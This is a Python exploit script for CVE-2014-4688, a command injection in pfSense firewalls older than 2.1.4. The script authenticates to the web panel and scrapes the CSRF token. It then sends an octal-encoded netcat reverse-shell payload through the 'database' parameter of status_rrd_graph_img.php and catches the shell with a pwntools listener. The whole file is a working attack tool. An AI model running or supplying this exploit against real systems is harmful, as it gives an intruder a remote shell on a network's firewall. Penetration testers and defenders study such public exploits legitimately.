# -*- coding: utf-8 -*-

# pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
# CVE: 2014-4688
# Exploit author: absolomb
# https://www.exploit-db.com/exploits/43560
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import requests
import sys
from pwn import *
from urllib3.exceptions import InsecureRequestWarning

# Suppressing SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def main():
    
    # args
    argparser = argparse.ArgumentParser(description="pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection", 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='pfSense host', 
                            required=True)
    
    main_arg.add_argument('--username', type=str,
                            help='pfSense username', 
                            required=True)
    
    main_arg.add_argument('--password', type=str,
                            help='pfSense password', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    username = args.username
    password = args.password
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
    
    # session
    sess = requests.Session()
    
    
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")
 
        l.sendline("""uname -a && id""")
        l.interactive()
        
    
    def grab_csrf():
        
        print(" [*] Grabbing pfSense CSRF token...")
        
        try:
            if burpsuite:
                r = sess.get("https://{}/index.php".format(rhost), verify=False, 
                                                                proxies=proxies)
            
            else:
                r = sess.get("https://{}/index.php".format(rhost), verify=False)
        
        except Exception as e:
            print(e)
            print(" [*] Failed to grab pfSense CSRF token due an error.")
            sys.exit(1)
        
        else:
            csrf_token = r.text.split("__csrf_magic' value=\"")[1].split('" />')[0]
        
        return csrf_token
    
    def login():
        
        params = {
            "__csrf_magic": grab_csrf(),
            "usernamefld": username,
            "passwordfld": password,
            "login": "Login"
        }
        
        try:
            if burpsuite:
                r = sess.post("https://{}/index.php".format(rhost), data=params, 
                                                                verify=False,
                                                                proxies=proxies)
            
            else:
                r = sess.post("https://{}/index.php".format(rhost), data=params,
                                                                    verify=False)
        
        except Exception as e:
            print(e)
            print(" [*] Failed to login into pfSense's panel due an error :(")
            sys.exit(1)
        
        else:
            if 'Dashboard' not in r.text:
                print(" [*] Failed to login into pfSense's panel, check your credentials.")
                sys.exit(1)
            
            else:
                print(" [*] Logged with success!")
                
                return True
    
    
    def encode_payload():
        
        encoded_payload = ""
        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f"
        payload += "|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(lhost, lport)
        
        for char in payload:
	        encoded_payload += ("\\" + oct(ord(char)).lstrip("0o"))
        
        else:
	        return encoded_payload
    
    
    def exploit():
        exploit_base_url = "/status_rrd_graph_img.php?database=queues;printf+'{}'|sh".format(encode_payload())
        
        print(" [*] Exploiting the pfSense...")
        
        l = listen(lport)
         
        try:
            if burpsuite:
                r = sess.get("https://{}{}".format(rhost, exploit_base_url), 
                                                                    verify=False,
                                                                    proxies=proxies,
                                                                    timeout=5)           
            
            else:
                r = sess.get("https://{}{}".format(rhost, exploit_base_url), 
                                                                    verify=False,
                                                                    timeout=5)
       
        except:
            reverse_shell(l)
            
                
    # main
    print(" [>] pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection")
    print(" [*] Python script exploit author: nullarmor")
    
    if login():
        exploit()
        

if __name__ == '__main__':
    main()
